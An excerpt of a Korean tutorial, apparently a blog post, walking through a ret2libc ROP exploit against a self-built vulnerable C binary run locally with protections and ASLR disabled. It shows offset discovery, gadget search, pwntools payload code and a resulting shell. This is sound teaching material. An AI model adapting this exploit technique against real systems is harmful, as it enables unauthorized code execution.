...
<hr />
<h2>환경과 코드</h2>
<pre class="highlight"><code class="language-c">// vuln.c
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
...
<p>컴파일:</p>
<pre class="highlight"><code class="language-bash">gcc -fno-stack-protector -no-pie vuln.c -o vuln
</code></pre>

<p>checksec 확인:</p>
<pre class="highlight"><code>Arch:   amd64-64-little
RELRO:  Partial RELRO
Stack:  No canary found
NX:     NX enabled
PIE:    No PIE (0x400000)
...
<pre class="highlight"><code class="language-bash">pwndbg&gt; r &lt;&lt;&lt; $(python3 -c &quot;from pwn import *; import sys; sys.stdout.buffer.write(cyclic(1000))&quot;)
</code></pre>

<p>crash 시점 레지스터:</p>
<pre class="highlight"><code>RBP  0x6161617261616171 ('qaaaraaa')
RSP  0x7fffffffe028  →  0x6161617461616173 ('saaataaa')
RIP  0x4011ae  ◂— ret
</code></pre>

<pre class="highlight"><code class="language-bash">pwndbg&gt; cyclic -l $rbp
Finding cyclic pattern of 4 bytes: b'qaaa'
Found at offset 64
</code></pre>

<p><code>cyclic -l $rbp</code>는 RBP 레지스터 값에서 패턴을 찾아 <strong>saved RBP의 위치</strong>를 반환합니다. return address는 거기서 8바이트 더 뒤에 위치합니다:</p>
<pre class="highlight"><code>[ buf 64B ] [ saved RBP 8B ] [ return address 8B ]
  offset 0        64                  72  ← 덮어야 할 위치
</code></pre>
...
<pre class="highlight"><code>[ padding ] [ system_addr ] [ dummy_ret ] [ binsh_addr ]
</code></pre>
...
<pre class="highlight"><code>실행 흐름:
1. ret      → 스택에서 [pop_rdi 주소]를 꺼내 RIP에 넣음
2. pop rdi  → 스택에서 [binsh_addr]를 꺼내 RDI에 넣음
3. ret      → 스택에서 [system_addr]를 꺼내 RIP에 넣음
4. system() → RDI = &quot;/bin/sh&quot; → 쉘
</code></pre>

<p>payload 구조:</p>
<pre class="highlight"><code>[ padding 72B ] [ pop_rdi 주소 ] [ binsh_addr ] [ ret 주소 ] [ system_addr ]
</code></pre>
...
<h2>가젯 찾기</h2>
<p>먼저 바이너리에서 탐색합니다:</p>
<pre class="highlight"><code class="language-bash">ROPgadget --binary ./vuln --only &quot;pop|ret&quot;
</code></pre>

<pre class="highlight"><code>0x000000000040115d : pop rbp ; ret
0x000000000040101a : ret
</code></pre>

<p><code>pop rdi; ret</code>이 바이너리에 없습니다. libc에서 가져와야 합니다. ASLR이 비활성화된 환경이므로 libc 베이스가 고정되어 있어 가젯 주소를 정적으로 계산할 수 있습니다:</p>
<pre class="highlight"><code class="language-python">pop_rdi = libc_base + next(libc.search(asm('pop rdi; ret')))
</code></pre>
...
<pre class="highlight"><code>pwnlib.exception.PwnlibException: Shellcode contains relocations: R_386_32 rdi
</code></pre>

<p>스택 정렬용 <code>ret</code> 가젯은 바이너리에서 가져옵니다:</p>
<pre class="highlight"><code class="language-python">ret_gadget = 0x40101a
</code></pre>

<hr />
<h2>주소 수집</h2>
<p>ASLR 비활성화 확인:</p>
<pre class="highlight"><code class="language-bash">cat /proc/sys/kernel/randomize_va_space   # 0 이면 비활성화
</code></pre>

<p>libc 베이스 주소 확인:</p>
<pre class="highlight"><code class="language-bash">ldd ./vuln
## libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7c00000)
</code></pre>
...
libc_base   = 0x00007ffff7c00000  # ldd로 확인한 고정 베이스 (ASLR 비활성화)
system_addr = libc_base + libc.symbols['system']
binsh_addr  = libc_base + next(libc.search(b'/bin/sh'))
pop_rdi     = libc_base + next(libc.search(asm('pop rdi; ret')))
ret_gadget  = 0x40101a  # 스택 16바이트 정렬용
...
<p>실행 결과:</p>
<pre class="highlight"><code class="language-bash">$ python3 exploit.py
[+] Starting local process './vuln': pid 44183
[*] Switching to interactive mode
Input: $ id
uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),135(lxd),136(sambashare)
